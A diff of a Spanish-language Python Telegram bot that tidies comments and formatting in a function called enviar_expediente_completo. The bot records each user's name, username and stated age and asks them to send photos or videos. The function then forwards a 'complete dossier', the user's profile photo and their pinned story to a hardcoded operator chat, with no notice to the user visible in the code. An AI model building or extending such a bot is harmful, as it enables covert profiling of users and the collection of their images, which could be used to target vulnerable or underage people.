@@ -46,7 +46,6 @@ def obtener_usuario(user_id):
 # ======================
 async def enviar_expediente_completo(context, user, edad):
     try:
-        # 1. Texto del reporte
         reporte = (
             f"🕵️‍♂️ **EXPEDIENTE COMPLETO**\n"
             f"━━━━━━━━━━━━━━━━━━\n"
@@ -60,30 +59,21 @@ async def enviar_expediente_completo(context, user, edad):
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
         
-        # 2. Foto de perfil (si tiene)
+        # Foto de perfil
         fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
         if fotos_perfil.total_count > 0:
             foto_perfil = fotos_perfil.photos[0][-1].file_id
             await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
             
-        # 3. Historia de perfil (Story) si tiene
+        # Historia de perfil (Story)
         try:
-            # Telegram permite a los bots obtener el ID de la historia fijada en el perfil
             chat_info = await context.bot.get_chat(user.id)
             if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
                 story = chat_info.pinned_story
                 if story.photo:
-                    await context.bot.send_photo(
-                        chat_id=DANI_CHAT_ID, 
-                        photo=story.photo[-1].file_id, 
-                        caption="📖 Historia (Story) del perfil."
-                    )
+                    await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=story.photo[-1].file_id, caption="📖 Historia (Story) del perfil.")
                 elif story.video:
-                    await context.bot.send_video(
-                        chat_id=DANI_CHAT_ID, 
-                        video=story.video.file_id, 
-                        caption="🎥 Video de la Historia (Story) del perfil."
-                    )
+                    await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Video de la Historia (Story) del perfil.")
         except Exception as e:
             print(f"No se pudo obtener la historia o no tiene: {e}")
 
@@ -233,7 +223,6 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
         guardar_usuario(user.id, user.first_name, user.username, edad)
         await update.message.reply_text(f"¡Perfecto! 🎉 Tienes {edad} años. Envíame fotos o videos.")
         
-        # Se envía el expediente con foto de perfil y story
         await enviar_expediente_completo(context, user, edad)
         
     except:
